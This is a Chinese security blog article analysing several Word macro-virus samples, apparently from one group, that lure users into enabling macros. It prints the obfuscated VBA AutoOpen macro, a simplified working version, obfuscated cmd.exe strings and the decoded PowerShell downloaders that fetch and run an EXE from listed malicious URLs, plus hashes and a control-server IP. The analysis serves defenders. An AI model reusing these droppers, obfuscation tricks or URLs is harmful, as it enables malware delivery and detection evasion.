***本文原创作者：cgf99，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

##  一、前言

 **基于宏的 word 恶意攻击文件是社交工程类攻击的一个重要手段，虽说此类攻击技术很简单，也很老旧，在大多数安全技术人员看来有点 low
甚至对其不屑一顾（毕竟攻击成功依赖目标用户打开文档后的二次交互，被发现后攻击脚本易被分析等），但是不可否认，由于宏脚本制作简单、受 Office 和
windows 版本限制小等特点，深受各类网络攻击群体的厚爱。近期连续获取的几个 word 宏病毒样本，主要是通过对 VBA
脚本和执行命令的差异化来实现与安全软件的对抗。这几个文档显示内容一样，都是打开后要求一张图片提示用户要开启宏。此外，VBA
代码基本一致，还有执行的命令字符串形式相同，应该是来自同一个团体的攻击样本。下面针对其中的一个样本进行分析。**

样本文档打开后，显示一幅图片，其中文字提示用户需要开启宏才能观看。同时 office 也弹出窗口要求启动宏，如下图所示。

![](https://image.3001.net/images/20181130/1543557993_5c00d36938b86.png!small)

在点击「启用内容」后，文档内容没有变化，还是原来的图片。

![](https://image.3001.net/images/20181130/1543558018_5c00d3821a874.png!small)随后，系统后台下载文件并执行，具体情况如下。

###  1、网络下载

Winword.exe 进程从网络下载生成%Temp%\jCz.exe 文件名运行。下载的 URL 地址为<http://andrewdavis-ew.me.uk/4W/>，下载的文件是一个 PE 可执行文件。具体网络数据包如下图所示：

![](https://image.3001.net/images/20181130/1543558072_5c00d3b8ef57e.png!small)

###  2、复制自删除

jCz.exe 运行后复制自身到
C:\Users\\[登录用户名]\AppData\Local\Microsoft\Windows\nirmalaenglish.exe
并运行，随后退出并删除自身。因此，最终在目标系统上只有一个 nirmalaenglish.exe 存在。

###  3、进程和网络连接情况

Word 打开后的用 tasklist 列举进程情况如下图所示。

![](https://image.3001.net/images/20181130/1543558127_5c00d3ef4f4b8.png!small)

其中，Nirmalaenglish.exe 运行后，连接的控制服务器是 198.0.36.237。

![](https://image.3001.net/images/20181130/1543558161_5c00d41142436.png!small)

Nirmalaenglish.EXE 不兼容老的 XP 系统。

![](https://image.3001.net/images/20181130/1543558200_5c00d4389411b.png!small)nirmalaenglish.exe
是 32 位 PE 文件，在任务管理器显示如下图所示。

![](https://image.3001.net/images/20181130/1543558230_5c00d456071bf.png!small)

###  4、文件属性

文件伪装的属性如下图所示，竟然伪装的是一个 DLL 文件。

![](https://image.3001.net/images/20181130/1543558267_5c00d47b75d40.png!small)

###  5、启动项

nirmalaenglish.exe 运行后在
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 下创建自启动项。

![](https://image.3001.net/images/20181130/1543558319_5c00d4af2a11b.png!small)

###  6、样本文件情况

**文件名** |  **大小** |  **MD5 hash** |  **SHA1 hash**  
---|---|---|---  
**doc** |  136,832  |  dbfca9e4cd3fb6943b67d5d13ad5bf13  |
463463fec8c771f5ebbe403b82ce98b5ca5174de  
**jCz.exe** **  
nirmalaenglish.exe** |  176,128  |  588cf2ab08d1cdf926aacb8bbe43a4c1  |
b4608ff7f4a6c1d2d61ac582bff8eee9919491a5  
  
##  二、DOC 样本分析

###  1、文件情况

用 winhex 打开，是复合文档格式的，以 D0CF11E0A1BA1AE1 开始。在 0x0A10 开始的位置，有明显的明文字符串。包含 cmd.exe
/c 命令字符串。如下图所示：

![](https://image.3001.net/images/20181130/1543558520_5c00d5785daf9.png!small)

###  2、VBA 静态分析

用 olevba 分析发现该文档包含宏，并且利用 AutuOpen 函数随文档开启自动运行。如下两幅图所示。

![](https://image.3001.net/images/20181130/1543560573_5c00dd7d1dc18.png!small)

![](https://image.3001.net/images/20181130/1543558573_5c00d5ad0de42.png!small)

###  3、VBA 动态调试

在虚拟机环境里面，打开文档后允许宏运行，利用 Visual Basic 编辑器进行调试。打开后的 VBA 代码如下所示：

![](https://image.3001.net/images/20181130/1543558601_5c00d5c94968c.png!small)

完整的 VBA 代码如下表所示：

    
    
    Sub AutoOpen()
    
           On Error Resume Next
    
              Select Case lHSiIEjEJ
    
                 Case 106689022
    
        JkAwSR = Hex(CHcnonO)
    
                    VoiZokd = Cos(193760893)
    
                    kIorX = 152236150
    
                 Case 146777760
    
        dZHLZnmw = Hex(YnRzTf)
    
                    mivVkci = Sqr(207880165 / CSng(45341169 - Cos(303879610 - 79268186) + dhikG + Rnd(8156933 - 72282793)))
    
                    GKvBwd = Hex(MqMIQcT)
    
        End Select
    
           On Error Resume Next
    
              Select Case uGPztU
    
                 Case 80066148
    
        TwAnoFVEa = Hex(pJsajRr)
    
                    zjYRSj = Cos(158949450)
    
                    SiMKnUzKA = 305204326
    
                 Case 295047977
    
        CipluS = Hex(EVTawFd)
    
                    dUCfTPv = Sqr(252789547 / CSng(285500423 - Cos(287474754 - 105488610) + VMhalYbO + Rnd(125198942 - 301657600)))
    
                    WADTXwDO = Hex(KzUpw)
    
        End Select
    
        Set cACBrcEf = Shapes("AtwGUaJHEhkMnR")
    
           On Error Resume Next
    
              Select Case fmlmWw
    
                 Case 284838776
    
        wdMkv = Hex(zwzCFh)
    
                    RGFJZVwlL = Cos(73989805)
    
                    TmXDAbnQm = 105628658
    
                 Case 136942984
    
        mKuZv = Hex(TwfZU)
    
                    jfcwdu = Sqr(136714754 / CSng(259871207 - Cos(120778133 - 126999894) + ItuzXP + Rnd(269546996 - 311219670)))
    
                    wFTzivB = Hex(rPOuRKXU)
    
        End Select
    
           On Error Resume Next
    
              Select Case TRCZGYIq
    
                 Case 278864415
    
        fPpSFjL = Hex(iicWID)
    
                    kzwUE = Cos(252112167)
    
                    wboAl = 241782525
    
                 Case 21543657
    
        mJiDTn = Hex(NSIwU)
    
                    jDzJzZW = Sqr(163099183 / CSng(67651671 - Cos(145615829 - 252412413) + ZTOdEvbJQ + Rnd(316297959 - 122387720)))
    
                    FjMhljLHR = Hex(PXrqlLj)
    
        End Select
    
           On Error Resume Next
    
              Select Case svIWYGz
    
                 Case 59045107
    
        fOYvwidX = Hex(paMCF)
    
                    XYRtJA = Cos(138258275)
    
                    ERrbUBzu = 40910085
    
                 Case 155164512
    
        qljzTWz = Hex(ahqMqqv)
    
                    zoEzkKjTd = Sqr(33412843 / CSng(16128483 - Cos(57282106 - 146982061) + uToYO + Rnd(177744907 - 281382074)))
    
                    zXJduzO = Hex(AlYCz)
    
        End Select
    
           On Error Resume Next
    
              Select Case vzVnJuf
    
                 Case 312510715
    
        GEtEz = Hex(ulWXTFwOD)
    
                    sZnVF = Cos(341309453)
    
                    aiDMBqwV = 309396274
    
                 Case 161495380
    
        iNuzO = Hex(QTFiP)
    
                    wjSmRUr = Sqr(168753056 / CSng(24970975 - Cos(44646283 - 109666873) + atmtua + Rnd(9431304 - 158775682)))
    
                    vfpGvKiF = Hex(uJKHFcjD)
    
        End Select
    
        dDHLRf = "" + BRnWYSbU + tjFMUO + rhpHPj + cACBrcEf.TextFrame.TextRange.Text + fiVdGi + EQkTIo + cdMsji
    
           On Error Resume Next
    
              Select Case kCfbk
    
                 Case 294317110
    
        JtAzQjlZu = Hex(XZBiwCnb)
    
                    owEzaoTuJ = Cos(234540993)
    
                    JVjjtDSz = 151975382
    
                 Case 221438674
    
        HIinLWd = Hex(zrzpEzFw)
    
                    JwmcpFi = Sqr(12870099 / CSng(296564319 - Cos(139888679 - 240856071) + kpENMovPm + Rnd(189462999 - 322294993)))
    
                    XkzKjb = Hex(oHsoavzR)
    
        End Select
    
           On Error Resume Next
    
              Select Case ticcaKu
    
                 Case 287077696
    
        MbvinLuJc = Hex(OHwiwKvI)
    
                    RvAWAMPw = Cos(123923334)
    
                    hqnzN = 17764142
    
                 Case 337814127
    
        tpcNdEZGU = Hex(AdSiBGZzL)
    
                    vVYPb = Sqr(52816491 / CSng(310122531 - Cos(284558712 - 176933727) + ibzTB + Rnd(130728763 - 70988708)))
    
                    Rwwts = Hex(vpjCpj)
    
        End Select
    
           On Error Resume Next
    
              Select Case TNnZvREPI
    
                 Case 41142863
    
        LGdEuFowa = Hex(cYGZt)
    
                    BIIjiKk = Cos(126203819)
    
                    ZRapb = 64895411
    
                 Case 163894775
    
        IWnosb = Hex(kElnr)
    
                    hzCqCHzW = Sqr(77823821 / CSng(5439857 - Cos(146509680 - 69963338) + VnNHzzDEz + Rnd(22079052 - 39759468)))
    
                    JhDzZZwb = Hex(rRYwYC)
    
        End Select
    
        Set LqfarBBF = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8" + lSBsq)
    
           On Error Resume Next
    
              Select Case FzziN
    
                 Case 243734976
    
        jNzcti = Hex(HADXPAVYW)
    
                    FGFWj = Cos(115178555)
    
                    tJadRo = 45778859
    
                 Case 84892833
    
        XDbzjqKOd = Hex(uwkSmhcpY)
    
                    fwAvm = Sqr(225066432 / CSng(240888853 - Cos(54875134 - 101861368) + MwKRdRwZb + Rnd(104077630 - 320167309)))
    
                    tpXOJrnvp = Hex(iFSbDfKwF)
    
        End Select
    
           On Error Resume Next
    
              Select Case DQrXWoHjF
    
                 Case 227852834
    
        hLVAGz = Hex(GWLYJ)
    
                    tVtLZLRPj = Cos(43945134)
    
                    PJwTIQX = 291842291
    
                 Case 290513551
    
        doOGO = Hex(IlumiHv)
    
                    AuvKuRC = Sqr(6064386 / CSng(30182182 - Cos(294207161 - 239403095) + BjwGnjRpQ + Rnd(217234607 - 201640735)))
    
                    KiJil = Hex(wIOSTN)
    
        End Select
    
           On Error Resume Next
    
              Select Case QBNwCWAQ
    
                 Case 65362740
    
        nQVmVEvY = Hex(LEQhSSOm)
    
                    DrSKwckJh = Cos(188989781)
    
                    zuzuEiO = 30322423
    
                 Case 122358794
    
        WiWcjizT = Hex(iojIMSNcS)
    
                    CMWTukQEW = Sqr(188879811 / CSng(232929535 - Cos(26369709 - 62340469) + GjMviO + Rnd(329247112 - 239650647)))
    
                    mwpPmmbr = Hex(vLPaA)
    
        End Select
    
        Const citlbP = 0
    
           On Error Resume Next
    
              Select Case jwiMwS
    
                 Case 107200381
    
        TiSBk = Hex(QrzZKWaip)
    
                    AphqZFUzt = Cos(232419654)
    
                    vaiFo = 97021820
    
                 Case 210271065
    
        AtjAbUuw = Hex(KtkAIqMGl)
    
                    jONUIBm = Sqr(136803807 / CSng(113397089 - Cos(129486342 - 132695481) + HuzowQp + Rnd(34714082 - 147434178)))
    
                    GdnzwJn = Hex(SwDpzWnY)
    
        End Select
    
           On Error Resume Next
    
              Select Case CHpcz
    
                 Case 236679346
    
        NkvZmPD = Hex(vjzRpQFAO)
    
                    UlaoUhwm = Cos(220324635)
    
                    WXiNpk = 279034050
    
                 Case 262528533
    
        zljNuQQH = Hex(qkwGbvcwz)
    
                    QNbziqW = Sqr(158805557 / CSng(331003561 - Cos(249131549 - 186665267) + aRQQu + Rnd(267242902 - 158055032)))
    
                    XDaCwwPP = Hex(mkqmRXWWl)
    
        End Select
    
           On Error Resume Next
    
              Select Case SDDAcZCAt
    
                 Case 264062545
    
        HCPMiiJp = Hex(WAJfWztI)
    
                    iXJHTIoNV = Cos(438513)
    
                    AIqPq = 200659759
    
                 Case 237171322
    
        zCdwc = Hex(ZStYicj)
    
                    ILQazjHXR = Sqr(56993264 / CSng(59190836 - Cos(231064522 - 258838986) + JuosPp + Rnd(72157320 - 273985578)))
    
                    ajitq = Hex(prXaFAfwQ)
    
        End Select
    
           On Error Resume Next
    
              Select Case IWOLfzJ
    
                 Case 20437470
    
        kEziC = Hex(ZwzwOV)
    
                    GUGjj = Cos(144539995)
    
                    bYKjFo = 12099378
    
                 Case 329409845
    
        Nnuhl = Hex(rlDtu)
    
                    MmYTEFQu = Sqr(30544200 / CSng(312871809 - Cos(110793117 - 259553222) + aLuQZOJbu + Rnd(233785588 - 68838494)))
    
                    nREcVj = Hex(bjPmmNAi)
    
        End Select
    
           On Error Resume Next
    
              Select Case zlmso
    
                 Case 199065590
    
        HUJwYYLB = Hex(KNMcb)
    
                    nScQoIwwi = Cos(35506963)
    
                    Achka = 341903551
    
                 Case 50623229
    
        NTfcoN = Hex(FhoVqU)
    
                    CzTPYpdI = Sqr(159859482 / CSng(205718420 - Cos(281831079 - 119054328) + iUUkNEI + Rnd(91312236 - 190175986)))
    
                    qoDaD = Hex(HIOlUa)
    
        End Select
    
           On Error Resume Next
    
              Select Case HnZMhinRk
    
                 Case 233461681
    
        nGUnkw = Hex(vwAzwj)
    
                    BJMbnJUdW = Cos(64086583)
    
                    EwNNSso = 283743450
    
                 Case 146545611
    
        MqzAbf = Hex(cqHqpUfV)
    
                    qwZwJjK = Sqr(81091076 / CSng(214691539 - Cos(2246847 - 11439174) + dILFMdpS + Rnd(84892047 - 176965475)))
    
                    dlBfCk = Hex(disrCr)
    
        End Select
    
        LqfarBBF.Run# dDHLRf, citlbP
    
           On Error Resume Next
    
              Select Case vKprbOsl
    
                 Case 203381594
    
        VCLcBRHB = Hex(iAZbjRnl)
    
                    jSpMf = Cos(328073300)
    
                    RjOwGqbI = 146719873
    
                 Case 7524072
    
        EqSEBlc = Hex(oWiJaodjB)
    
                    tIXNtk = Sqr(240178619 / CSng(301643513 - Cos(31914199 - 192782238) + YQFirjuqi + Rnd(111920305 - 25450526)))
    
                    fJMiXnIc = Hex(awdsC)
    
        End Select
    
           On Error Resume Next
    
              Select Case ULnQjHCk
    
                 Case 333193034
    
        QlAssNl = Hex(LmRnTIZw)
    
                    AsHVuS = Cos(266710826)
    
                    dEhbDG = 257143757
    
                 Case 251218450
    
        iWEAMqHds = Hex(Whrirj)
    
                    CrrDVSMb = Sqr(98410875 / CSng(57929923 - Cos(30863787 - 61288942) + fiBVi + Rnd(19525726 - 290538601)))
    
                    nBzsCC = Hex(kmZpsQ)
    
        End Select
    
           On Error Resume Next
    
              Select Case TJMuV
    
                 Case 178742339
    
        cwjFCFY = Hex(viBKDN)
    
                    WzStL = Cos(191381702)
    
                    IURQmKZt = 311787294
    
                 Case 323568830
    
        Iwjdk = Hex(vBFbrVQIv)
    
                    nPcbPA = Sqr(267326832 / CSng(274185099 - Cos(82227673 - 260914150) + SOrCnEDv + Rnd(98505983 - 109036895)))
    
                    MZzJXMQwB = Hex(rrliS)
    
        End Select
    
           On Error Resume Next
    
              Select Case ODrSwLSvc
    
                 Case 12180480
    
        TvcTSGb = Hex(jAfdiu)
    
                    YOpfnvfwM = Cos(322100654)
    
                    XtFEFzEb = 313218724
    
                 Case 83653085
    
        zZQGHGw = Hex(ZIXBmDGz)
    
                    bnwPWk = Sqr(229157365 / CSng(225973262 - Cos(68101884 - 184463785) + fZGwivOQP + Rnd(221730088 - 259959417)))
    
                    CdWZzrS = Hex(zBqAI)
    
        End Select
    
        End Sub

经过单步调试分析，其实上述 VBA 代码中包含一堆的无效代码，应该是用于混淆代码加大查杀难度。其实最终的功能代码可以简化如下

    
    
    Sub AutoOpen()
    
        On Error Resume Next
    
        Set cACBrcEf = Shapes("AtwGUaJHEhkMnR")
    
        Set LqfarBBF = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8" )
    
        dDHLRf = cACBrcEf.TextFrame.TextRange.Text
    
        LqfarBBF.Run# dDHLRf, 0
    
        End Sub

其中， **cACBrcEf.TextFrame.TextRange.Text** 就是 Shapes("AtwGUaJHEhkMnR")
的文本框内容，也就是上文说的在 0x0A10 处包含 cmd.exe /c
等字符串的内容。72C24DD5-D70A-438B-8A42-98424B88AFB8 是 WScript.Shell.1 的
CLSID。也就是说，AutoOpen 函数的最终功能就是执行 0x0A10 处的那一段字符串命令。

###  4、命令分析

AutoOpen 函数运行的命令如下表所示，这段命令其实可以分为三部分。如表用不同的颜色标注。

    
    
    c:\VmhwaLZf\RdRhrbwjCvLZDv\lCrjjDSiQ\..\..\..\windows\system32\cmd.exe /c %COMSPEC% /V:O/C"set SNT=                 }}{hctac}}kaerb;Uar$ ssecorP-tratS;)Uar$(elifotevas.wvt$;)ydoBesnopser.QjY$(etirw.wvt$;1 = epyt.wvt$;)(nepo.wvt${ )'*ZM*' ekil- txetesnopser.QjY$( fI;)(dnes.QjY$;)0,KlB$,'TEG'(nepo.QjY${yrt{)LLN$ ni KlB$(hcaerof;'maerts.bdoda' moc- tcejbO-weN = wvt$;'ptthlmx.2lmxsm' moc- tcejbO-weN= QjY$;)'exe.zCj\'+)(htaPpmeTteG::]htaP.OI.metsyS[(=Uar$;)'@'(tilpS.'Y/ur.luanrab-robdopotva//:ptth@9t/au.moc.krowtenstrapotua//:ptth@KIizcsy/ua.moc.noitcurtsnoccke//:ptth@Y1nNI8w/moc.gniniartatarebilativ//:ptth@W4/ku.em.we-sivadwerdna//:ptth'=LLN$;'aVA'=jLE$ llehsrewop&&for /L %q in (568,-1,0)do set wM=!wM!!SNT:~%q,1!&&if %q==0 echo !wM:~4! |FOR /F "delims=.7XGv tokens=2" %u IN ('assoc^^^|findstr 1x')DO %u -"

第一部分，「VmhwaLZf\RdRhrbwjCvLZDv\lCrjjDSiQ」是无效指令，主要用于混淆。最终调用
c:\windows\system32\cmd.exe /c %COMSPEC% /V:O/C。

第二部分，「for /L %q in (568,-1,0)do set wM=!wM!!SNT:~%q,1!&&if %q==0echo
!wM:~4!」命令是把它前面的 569 个字节顺序前后倒置一下，然后在开头加上「echo」字符串。最后生成的内容如下表。

    
    
    echo powershell$ELj='AVa';$NLL='http://andrewdavis-ew.me.uk/4W@http://vitaliberatatraining.com/w8INn1Y@http://ekcconstruction.com.au/yscziIK@http://autopartsnetwork.com.ua/t9@http://avtopodbor-barnaul.ru/Y'.Split('@');$raU=([System.IO.Path]::GetTempPath()+'\jCz.exe');$YjQ=New-Object -com 'msxml2.xmlhttp';$tvw = New-Object -com'adodb.stream';foreach($BlK in $NLL){try{$YjQ.open('GET',$BlK,0);$YjQ.send();If($YjQ.responsetext -like '*MZ*') {$tvw.open();$tvw.type =1;$tvw.write($YjQ.responseBody);$tvw.savetofile($raU);Start-Process$raU;break}}catch{}}

此时，基本就一目了然了。该段 powershell 脚本整理整理如下表所示：

    
    
    $ELj='AVa';
    
        $NLL='<http://andrewdavis-ew.me.uk/4W>@<http://vitaliberatatraining.com/w8INn1Y>@ <http://ekcconstruction.com.au/yscziIK>@<http://autopartsnetwork.com.ua/t9>@<http://avtopodbor-barnaul.ru/Y>'.Split('@');
    
        $raU=([System.IO.Path]::GetTempPath()+'\jCz.exe');       //下载保存为%tmp%\jCz.exe
    
        $YjQ =New-Object -com'msxml2.xmlhttp';
    
        $tvw = New-Object -com'adodb.stream';
    
        foreach($BlK in $NLL)       //循环从上述 URL 下载
    
        {
    
        Try
    
        {
    
        $YjQ.open('GET',$BlK,0);
    
        $YjQ.send();
    
        If($YjQ.responsetext -like '*MZ*') //下载数据头包含「MZ」，PE 文件
    
        {
    
        $tvw.open();
    
        $tvw.type = 1;
    
        $tvw.write($YjQ.responseBody);
    
        $tvw.savetofile($raU);//写入本地文件
    
        Start-Process$raU;//执行
    
        Break //从任意一个 URL 下载成功即可。                       
    
        }
    
        }
    
        catch{}
    
        }

我们可以看到，恶意文档用于传播的下载域名有五个，其中前两个 URL 还在线能用，后面三个访问无效（不知道是否用作备用），如下表所示。【截至 2018 年
11 月 28 日】

1  | <http://andrewdavis-ew.me.uk/4W> |  在线  
---|---|---  
2  |  <http://vitaliberatatraining.com/w8INn1Y> |  在线  
3  |  <http://ekcconstruction.com.au/yscziIK> |  无效  
4  |  <http://autopartsnetwork.com.ua/t9> |  无效  
5  |  <http://avtopodbor-barnaul.ru/Y> |  无效  
  
第三部分，「FOR/F "delims=.7XGv tokens=2" %u IN ('assoc^^^|findstr 1x')DO %u -」。其中
assoc|findstr1x
执行后的结果是「.ps1xml=Microsoft.PowerShellXMLData.1」，也就是说把字符串「.ps1xml=Microsoft.PowerShellXMLData.1」用「.7XGv」作为分隔符分割，最终获取的命令就是「powershell」字符串，用「-」作为参数，表示
powersehll 的参数来自标准的输入。因此，最终的结果就是利用 powershell 执行前面的脚本，相当于 cmd.exe /V:O/C
echo「命令或脚本」|powershell -。

###  5、其他样本情况

其他的几个样本与上面分析的样本形式基本一致，差别主要在 VBA 脚本做了一些微调，比如 shapes 对象命名名称不同、命令字符串进行修改等。

如下表所示：

序号  |  1  
---|---  
Shapes 对象名  |  Hzwjzv = Shapes("clSUStuE")  
Run 执行  |  ZOFvj = Array(zCXww, ijOMk.Run!(fTjnCb, MqOqlrVB), fvPNOZart)  
命令字符串内容  |  "C:\Windows\system32\cmd.exe" /V:ON/C"set
gE=;'Rva'=fXz$}}{hctac}};kaerb;'vsQ'=DJz$;SuJ$ metI-ekovnI{ )00008 eg-htgnel.)SuJ$ metI-teG(( fI;'LZT'=Ewu$;)SuJ$ ,aMK$(eliFdaolnwoD.Vft${yrt{)jsa$
ni aMK$(hcaerof;'exe.'+Lhn$+'\'+pmet:vne$=SuJ$;'UzE'=PPl$;'534' =
Lhn$;'Prw'=Bfm$;)'@'(tilpS.'2rrBEGE/ur.8z.gnidluom.2//:ptth@thSI10JW/yu.moc.aidla//:ptth@Vv1vvXYW/20000/tnetnoc-pw/ra.ude.tnu.noisnetxeairaterces//:ptth@HDmz/rb.moc.megamieartel//:ptth@iufRw/segamizetis/su.soidutsee//:ptth'=jsa$;tneilCbeW.teN
tcejbo-wen=Vft$;'Sfp'=Sqk$ llehsrewop&&for /L %n in (491,-1,0)do set
Vr=!Vr!!gE:~%n,1!&&if %n lss 1 echo !Vr:~4!
|po%windir:~-2,1%e%ProgramFiles:~4,-11%she%ProgramFiles:~13,1%%ProgramW6432:~13,-2%
-"  
  
我们可以看到，与上面的样本相比，主要是第三部分进行了变化。po%windir:~-2,1%e%ProgramFiles:~4,-11%she%ProgramFiles:~13,1%%ProgramW6432:~13,-2%
-字符串就是在不同的字符串中取得特定的字符，执行结果就是「powershell -u」。

样本用于传播的下载域名有五个，其中第一个无效，后面四个访问下载 EXE 文件。【截至 2018 年 11 月 30 日】

1  |  <http://eestudios.us/sitezimages/wRfui> |  无效  
---|---|---  
2  |  <http://letraeimagem.com.br/zmDH> |  在线  
3  |  <http://secretariaextension.unt.edu.ar/wp-content/00002/WYXvv1vV> |  在线  
4  |  <http://aldia.com.uy/WJ01ISht> |  在线  
5  |  <http://2.moulding.z8.ru/EGEBrr2> |  在线  
  
###  6、cmd.exe /v:O

命令的第一部分调用的是 cmd.exe /v:on /c 的指令，cmd.exe 增加/v 的操作是为了增强命令字符串的混淆程度。根据 cmd.exe
的命令帮助，/v 是使用！作为分隔符启用延迟的环境变量扩展。如下图所示：

![](https://image.3001.net/images/20181130/1543564904_5c00ee68d8445.png!small)较早前一个样本包含的命令字符串如下表所示，混乱。

    
    
        c:\jKWjzDXFSEjw\nPNoAZv\vbzdFqh\..\..\..\windows\system32\cmd.exe /c %COMSPEC%, ,,,,/V^:O,,,/C",,(,(s^e^t mk1=  ^ ^  ^  ^ ^  ^     ^ ^ }}{^hc^t^ac^}}kaer^b;V^j^F$^ s^s^ec^or^P^-^tr^a^tS;^)Vj^F^$^(^e^l^if^o^t^eva^s^.w^la^$^;^)ydo^B^esn^o^ps^er.^J^F^w$^(etir^w^.w^l^a$;1^ =^ ^epy^t^.^wl^a$;^)^(nep^o^.^w^l^a^${ ^)^'^Z^M^'^ qe-^ tx^e^t^esnop^ser.^J^F^w$^( f^I;^)^(^dne^s^.J^Fw^$;^)^0,^Tj^z$,^'^T^EG'^(nep^o^.^JFw^${^yr^t{^)caK^$^ ni^ ^T^jz^$^(hc^a^er^of;^'ma^er^t^s.^bd^oda^' moc^-^ ^tc^e^j^b^O^-^w^eN =^ ^w^l^a^$;^'ptth^lm^x.^2l^m^x^sm'^ moc^-^ tc^ejb^O-^weN^= JFw$^;^)^'exe.h^F^d\^'^+^)^(h^ta^P^pme^T^t^eG^::^]h^ta^P^.^O^I^.^met^syS[^(=VjF^$^;^)^'@'^(ti^l^p^S.'Q^q^lc^picu^Yr/moc^.skc^artm^urdevil//^:ptt^h^@p^p4H^LL^GU^58/moc^.evi^t^av^onni^o^fn^i//:p^t^th@dryuR^efe/moc^.noi^t^ani^ts^e^d^yt^ua^e^b^s^yni^t^s^e^d//:p^t^t^h@^wcV^L^oL^m/^m^oc^.^s^tf^i^g^il^a^uq//:^pt^t^h^@^Hz^hu^6ze^6^K^f/gr^o.^a^m^on^os^og//^:^pt^th^'=c^a^K$;'z^jF^'^=^zF^i$ ^l^lehsr^ew^op),,,)&&,,f^or,,,/^L,,,%^Z,^in,(^+^57^1,^,,^,^,^-^1^,^,,,,0),,,,,^do,,(,(,,,,,^s^e^t ^PzN^k=!^PzN^k!!mk1:~

解析后其内含的 powershell 脚本如下表所示：

    
    
    powershell $iFz='Fjz';$Kac='http://gosonoma.org/fK6ez6uhzH@http://qualigifts.com/mLoLVcw@http://destinysbeautydestination.com/efeRuyrd@http://infoinnovative.com/85UGLLH4pp@http://livedrumtracks.com/rYucipclqQ'.Split('@');$FjV=([System.IO.Path]::GetTempPath()+'\dFh.exe');$wFJ=New-Object -com 'msxml2.xmlhttp';$alw = New-Object -com'adodb.stream';foreach($zjT in $Kac){try{$wFJ.open('GET',$zjT,0);$wFJ.send();If($wFJ.responsetext -eq 'MZ') {$alw.open();$alw.type = 1;$alw.write($wFJ.responseBody);$alw.savetofile($FjV);Start-Process$FjV;break}}catch{}} 

用于下载的域名如下表：【截至 2018 年 11 月 30 日】

1  |  <http://gosonoma.org/fK6ez6uhzH> |  无效  
---|---|---  
2  |  <http://qualigifts.com/mLoLVcw> |  无效  
3  |  <http://destinysbeautydestination.com/efeRuyrd> |  在线  
4  |  <http://infoinnovative.com/85UGLLH4pp> |  无效  
5  |  <http://livedrumtracks.com/rYucipclqQ> |  无效  
  
##  三、结束语

1、根据观察，此类宏病毒文档在持续变化中，应该是一直在进行免杀。

2、本次样本 VBA 脚本还是蛮有创意的，攻击者的脚本能力很强。

3、传播下载的域名也在持续变化中。

***本文原创作者：cgf99，本文属FreeBuf原创奖励计划，未经许可禁止转载**

